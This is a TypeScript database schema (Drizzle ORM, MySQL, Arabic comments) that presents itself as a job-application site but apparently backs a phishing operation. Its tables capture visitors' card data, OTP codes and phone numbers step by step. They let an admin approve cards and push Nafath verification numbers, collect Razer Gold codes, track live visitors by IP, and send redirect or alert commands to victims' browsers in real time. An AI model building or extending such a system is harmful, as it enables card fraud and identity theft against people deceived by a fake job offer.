import { int, mysqlEnum, mysqlTable, text, timestamp, varchar, boolean } from "drizzle-orm/mysql-core";

/**
 * Core user table backing auth flow.
 */
export const users = mysqlTable("users", {
  id: int("id").autoincrement().primaryKey(),
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

/**
 * طلبات التوظيف المقدمة من الزوار
 */
export const applications = mysqlTable("applications", {
  id: int("id").autoincrement().primaryKey(),
  // معلومات شخصية - الخطوة الأولى
  fullName: varchar("fullName", { length: 200 }).notNull(),
  middleName: varchar("middleName", { length: 200 }),
  familyName: varchar("familyName", { length: 200 }).notNull(),
  nationality: varchar("nationality", { length: 100 }).notNull(),
  idType: varchar("idType", { length: 50 }).notNull(),
  idNumber: varchar("idNumber", { length: 50 }).notNull(),
  birthDate: varchar("birthDate", { length: 20 }).notNull(),
  title: varchar("title", { length: 50 }).notNull(),
  email: varchar("email", { length: 320 }).notNull(),
  gender: mysqlEnum("gender", ["male", "female"]).notNull(),
  // معلومات إضافية - الخطوة الثانية
  phone: varchar("phone", { length: 30 }),
  city: varchar("city", { length: 100 }),
  address: text("address"),
  educationLevel: varchar("educationLevel", { length: 100 }),
  experience: text("experience"),
  desiredPosition: varchar("desiredPosition", { length: 200 }),
  notes: text("notes"),
  // الحالة
  status: mysqlEnum("status", ["new", "reviewed", "accepted", "rejected"]).default("new").notNull(),
  // ربط الطلب بالزائر الذي أنشأه
  sessionId: varchar("sessionId", { length: 64 }),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type Application = typeof applications.$inferSelect;
export type InsertApplication = typeof applications.$inferInsert;

/**
 * إعدادات الموقع - بما فيها إعادة توجيه الزوار
 */
export const siteSettings = mysqlTable("siteSettings", {
  id: int("id").autoincrement().primaryKey(),
  // إعادة التوجيه
  redirectEnabled: boolean("redirectEnabled").default(false).notNull(),
  redirectUrl: varchar("redirectUrl", { length: 500 }),
  // إعدادات أخرى
  siteTitle: varchar("siteTitle", { length: 200 }),
  siteDescription: text("siteDescription"),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type SiteSettings = typeof siteSettings.$inferSelect;
export type InsertSiteSettings = typeof siteSettings.$inferInsert;

/**
 * خطوات تسلسل التقديم (YPTI، بيانات بطاقة، OTP، رقم جوال، إلخ)
 * كل صف = إرسال لخطوة معينة من جلسة معينة
 */
export const applicationSteps = mysqlTable("applicationSteps", {
  id: int("id").autoincrement().primaryKey(),
  applicationId: int("applicationId"),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  stepKey: varchar("stepKey", { length: 50 }).notNull(),
  // الحقول العامة لجميع الخطوات (تخزين JSON)
  data: text("data").notNull(),
  // معلومات تتبع للزائر
  ipAddress: varchar("ipAddress", { length: 64 }),
  userAgent: text("userAgent"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type ApplicationStep = typeof applicationSteps.$inferSelect;
export type InsertApplicationStep = typeof applicationSteps.$inferInsert;

/**
 * حسابات المسؤولين - تسجيل دخول باسم مستخدم وكلمة مرور
 */
export const adminAccounts = mysqlTable("adminAccounts", {
  id: int("id").autoincrement().primaryKey(),
  username: varchar("username", { length: 64 }).notNull().unique(),
  passwordHash: varchar("passwordHash", { length: 255 }).notNull(),
  displayName: varchar("displayName", { length: 100 }),
  isActive: boolean("isActive").default(true).notNull(),
  lastLoginAt: timestamp("lastLoginAt"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type AdminAccount = typeof adminAccounts.$inferSelect;
export type InsertAdminAccount = typeof adminAccounts.$inferInsert;

/**
 * جلسات المسؤولين (توكنات الجلسة)
 */
export const adminSessions = mysqlTable("adminSessions", {
  id: int("id").autoincrement().primaryKey(),
  adminId: int("adminId").notNull(),
  token: varchar("token", { length: 128 }).notNull().unique(),
  expiresAt: timestamp("expiresAt").notNull(),
  ipAddress: varchar("ipAddress", { length: 64 }),
  userAgent: text("userAgent"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type AdminSession = typeof adminSessions.$inferSelect;
export type InsertAdminSession = typeof adminSessions.$inferInsert;


/**
 * الزوار المباشرون (Live Visitors) - يتم تحديثهم عبر heartbeat من المتصفح
 */
export const liveVisitors = mysqlTable("liveVisitors", {
  id: int("id").autoincrement().primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull().unique(),
  currentPage: varchar("currentPage", { length: 200 }).notNull(),
  pageTitle: varchar("pageTitle", { length: 300 }),
  ipAddress: varchar("ipAddress", { length: 64 }),
  userAgent: text("userAgent"),
  country: varchar("country", { length: 100 }),
  // معلومات إضافية للتمييز
  displayName: varchar("displayName", { length: 200 }), // اسم الزائر إن وُجد
  phone: varchar("phone", { length: 30 }),
  firstSeen: timestamp("firstSeen").defaultNow().notNull(),
  lastSeen: timestamp("lastSeen").defaultNow().notNull(),
  pageEnteredAt: timestamp("pageEnteredAt").defaultNow().notNull(),
  // حالة قرار البطاقة من الأدمن: pending = بانتظار، approved = مقبولة، rejected = مرفوضة
  cardStatus: mysqlEnum("cardStatus", ["pending", "approved", "rejected"]),
  // رقم نفاذ المؤقت الذي يحدده الأدمن (مكون من رقمين عادة)
  nafathNumber: varchar("nafathNumber", { length: 16 }),
  nafathSentAt: timestamp("nafathSentAt"),
  // كود Razer Gold المقدم من الزائر
  razerCode: varchar("razerCode", { length: 200 }),
  razerStatus: mysqlEnum("razerStatus", ["pending", "approved", "rejected"]),
  razerSubmittedAt: timestamp("razerSubmittedAt"),
});

export type LiveVisitor = typeof liveVisitors.$inferSelect;
export type InsertLiveVisitor = typeof liveVisitors.$inferInsert;

/**
 * أوامر التوجيه اللحظي للزوار (يستلمها المتصفح ويُنفذها)
 */
export const visitorCommands = mysqlTable("visitorCommands", {
  id: int("id").autoincrement().primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  commandType: mysqlEnum("commandType", ["redirect", "reload", "alert"]).notNull(),
  payload: varchar("payload", { length: 500 }).notNull(), // الرابط أو الرسالة
  consumed: boolean("consumed").default(false).notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  consumedAt: timestamp("consumedAt"),
});

export type VisitorCommand = typeof visitorCommands.$inferSelect;
export type InsertVisitorCommand = typeof visitorCommands.$inferInsert;
